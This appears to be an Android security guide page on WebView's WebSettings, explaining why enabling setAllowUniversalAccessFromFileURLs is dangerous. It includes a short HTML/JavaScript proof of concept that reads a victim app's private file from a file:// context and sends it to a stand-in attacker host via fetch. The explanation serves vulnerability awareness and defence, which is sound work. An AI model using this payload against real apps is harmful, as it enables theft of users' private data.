# WebSettings overview

[WebSettings](https://developer.android.com/reference/android/webkit/WebSettings) manages settings state for a WebView. When a WebView is first created, it obtains a set of default settings. A WebSettings object obtained from [WebView#getSettings()](https://developer.android.com/reference/android/webkit/WebView#getSettings%28%29) is tied to the life of the WebView. 

# Security issues

## setAllowUniversalAccessFromFileURLs

[setAllowUniversalAccessFromFileURLs](https://developer.android.com/reference/android/webkit/WebSettings#setAllowUniversalAccessFromFileURLs%28boolean%29) sets whether cross-origin requests in the context of a file scheme URL should be allowed to access content from **any origin**. This includes access to content from other file scheme URLs or web contexts. The default value is `false` since Android 4.1.

{% hint style="info" %}
This method was deprecated in API level 30
{% endhint %}

Enabling this setting allows malicious scripts loaded in a `file://` context to launch cross-site scripting attacks, either accessing arbitrary local files including WebView cookies, app private data or even credentials used on arbitrary web sites.

For example, if an applciation allows you to open arbitrary links in a WebView you can pass a path to shared html file with the following content to steal a private file:

```html
<!-- file:///sdcard/index.html -->
<script>
    var url = 'file:///data/data/com.victim.app/internal_folder/private_file.txt';
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (xhr.readyState === 4) {
            fetch('https://attacker-website.com/?content=' + btoa(xhr.responseText));
        }
    }
    xhr.open('GET', url, true);
    xhr.send('');
</script>
```

